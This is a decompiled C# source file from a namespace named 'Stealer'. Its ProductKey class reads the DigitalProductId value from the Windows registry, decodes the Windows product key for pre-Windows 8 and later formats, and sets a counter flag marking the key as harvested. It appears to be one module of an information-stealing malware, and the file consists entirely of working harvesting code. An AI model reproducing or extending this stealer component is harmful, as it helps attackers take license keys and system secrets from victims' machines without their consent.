using System;
using System.Collections;
using Microsoft.Win32;

namespace Stealer
{
	// Token: 0x0200001B RID: 27
	public class ProductKey
	{
		// Token: 0x06000090 RID: 144 RVA: 0x00005844 File Offset: 0x00003A44
		public static string DecodeProductKeyWin8AndUp(byte[] digitalProductId)
		{
			string text = string.Empty;
			byte b = digitalProductId[66] / 6 & 1;
			digitalProductId[66] = ((digitalProductId[66] & 247) | (b & 2) * 4);
			int num = 0;
			for (int i = 24; i >= 0; i--)
			{
				int num2 = 0;
				for (int j = 14; j >= 0; j--)
				{
					num2 *= 256;
					num2 = (int)digitalProductId[j + 52] + num2;
					digitalProductId[j + 52] = (byte)(num2 / 24);
					num2 %= 24;
					num = num2;
				}
				text = "BCDFGHJKMPQRTVWXY2346789"[num2].ToString() + text;
			}
			string str = text.Substring(1, num);
			string str2 = text.Substring(num + 1, text.Length - (num + 1));
			text = str + "N" + str2;
			for (int k = 5; k < text.Length; k += 6)
			{
				text = text.Insert(k, "-");
			}
			return text;
		}

		// Token: 0x06000091 RID: 145 RVA: 0x00005934 File Offset: 0x00003B34
		private static string DecodeProductKey(byte[] digitalProductId)
		{
			char[] array = new char[]
			{
				'B',
				'C',
				'D',
				'F',
				'G',
				'H',
				'J',
				'K',
				'M',
				'P',
				'Q',
				'R',
				'T',
				'V',
				'W',
				'X',
				'Y',
				'2',
				'3',
				'4',
				'6',
				'7',
				'8',
				'9'
			};
			char[] array2 = new char[29];
			ArrayList arrayList = new ArrayList();
			for (int i = 52; i <= 67; i++)
			{
				arrayList.Add(digitalProductId[i]);
			}
			for (int j = 28; j >= 0; j--)
			{
				if ((j + 1) % 6 == 0)
				{
					array2[j] = '-';
				}
				else
				{
					int num = 0;
					for (int k = 14; k >= 0; k--)
					{
						int num2 = num << 8 | (int)((byte)arrayList[k]);
						arrayList[k] = (byte)(num2 / 24);
						num = num2 % 24;
						array2[j] = array[num];
					}
				}
			}
			return new string(array2);
		}

		// Token: 0x06000092 RID: 146 RVA: 0x000059F0 File Offset: 0x00003BF0
		private static string GetWindowsProductKeyFromDigitalProductId(byte[] digitalProductId, ProductKey.DigitalProductIdVersion digitalProductIdVersion)
		{
			if (digitalProductIdVersion != ProductKey.DigitalProductIdVersion.Windows8AndUp)
			{
				return ProductKey.DecodeProductKey(digitalProductId);
			}
			return ProductKey.DecodeProductKeyWin8AndUp(digitalProductId);
		}

		// Token: 0x06000093 RID: 147 RVA: 0x00005A04 File Offset: 0x00003C04
		public static string GetWindowsProductKeyFromRegistry()
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
			RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
			object obj = (registryKey2 != null) ? registryKey2.GetValue("DigitalProductId") : null;
			if (obj == null)
			{
				return "Failed to get DigitalProductId from registry";
			}
			byte[] digitalProductId = (byte[])obj;
			registryKey.Close();
			bool flag = (Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor >= 2) || Environment.OSVersion.Version.Major > 6;
			Counter.ProductKey = true;
			return ProductKey.GetWindowsProductKeyFromDigitalProductId(digitalProductId, flag ? ProductKey.DigitalProductIdVersion.Windows8AndUp : ProductKey.DigitalProductIdVersion.UpToWindows7);
		}

		// Token: 0x02000064 RID: 100
		public enum DigitalProductIdVersion
		{
			// Token: 0x04000103 RID: 259
			UpToWindows7,
			// Token: 0x04000104 RID: 260
			Windows8AndUp
		}
	}
}
